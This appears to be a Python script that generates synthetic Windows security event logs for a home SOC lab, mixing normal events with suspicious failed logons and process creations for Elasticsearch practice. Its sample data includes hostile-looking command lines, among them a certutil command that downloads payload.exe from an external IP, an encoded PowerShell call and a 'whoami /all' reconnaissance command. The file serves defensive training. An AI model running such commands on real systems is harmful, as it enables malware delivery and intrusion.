#!/usr/bin/env python3
"""
Generates synthetic security event logs for the home SOC lab.

Produces a mix of normal and suspicious events (failed logons, process
creation, PowerShell execution) as newline-delimited JSON, ready to be
bulk-ingested into Elasticsearch with scripts/ingest_logs.sh.

Usage:
    python3 generate_sample_logs.py --count 500 --out sample-logs/events.ndjson
"""
import argparse
import json
import random
from datetime import datetime, timedelta, timezone

HOSTS = ["WIN-DESKTOP01", "WIN-DESKTOP02", "WIN-SRV-DB01"]
USERS = ["jsmith", "aortiz", "mchen", "svc_backup", "administrator"]
SOURCE_IPS_NORMAL = ["10.0.10.11", "10.0.10.12", "10.0.10.13"]
SOURCE_IPS_SUSPICIOUS = ["185.220.101.47", "45.155.205.12", "91.243.85.30"]

PROCESSES_NORMAL = ["explorer.exe", "outlook.exe", "chrome.exe", "notepad.exe", "teams.exe"]
PROCESSES_SUSPICIOUS = [
    "powershell.exe -enc JABzAD0ATgBlAHcA",
    "cmd.exe /c whoami /all",
    "certutil.exe -urlcache -f http://185.220.101.47/payload.exe",
    "rundll32.exe suspicious.dll,EntryPoint",
]


def random_timestamp(hours_back=24):
    now = datetime.now(timezone.utc)
    delta = timedelta(seconds=random.randint(0, hours_back * 3600))
    return (now - delta).isoformat()


def make_failed_logon(suspicious=False):
    return {
        "@timestamp": random_timestamp(),
        "event.code": "4625",
        "event.action": "logon-failed",
        "host.name": random.choice(HOSTS),
        "user.name": random.choice(USERS),
        "source.ip": random.choice(SOURCE_IPS_SUSPICIOUS if suspicious else SOURCE_IPS_NORMAL),
        "winlog.logon.type": 3,
        "tags": ["suspicious"] if suspicious else ["normal"],
    }


def make_process_creation(suspicious=False):
    return {
        "@timestamp": random_timestamp(),
        "event.code": "4688",
        "event.action": "process-creation",
        "host.name": random.choice(HOSTS),
        "user.name": random.choice(USERS),
        "process.command_line": random.choice(PROCESSES_SUSPICIOUS if suspicious else PROCESSES_NORMAL),
        "process.parent.name": "explorer.exe" if not suspicious else "winword.exe",
        "tags": ["suspicious"] if suspicious else ["normal"],
    }


def make_event():
    # ~15% of generated events are suspicious, mirroring a noisy-but-mostly-normal environment
    suspicious = random.random() < 0.15
    kind = random.choice(["logon", "process"])
    if kind == "logon":
        return make_failed_logon(suspicious)
    return make_process_creation(suspicious)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--count", type=int, default=500, help="Number of events to generate")
    parser.add_argument("--out", default="sample-logs/events.ndjson", help="Output file path")
    args = parser.parse_args()

    with open(args.out, "w") as f:
        for _ in range(args.count):
            f.write(json.dumps(make_event()) + "\n")

    print(f"Generated {args.count} events -> {args.out}")


if __name__ == "__main__":
    main()
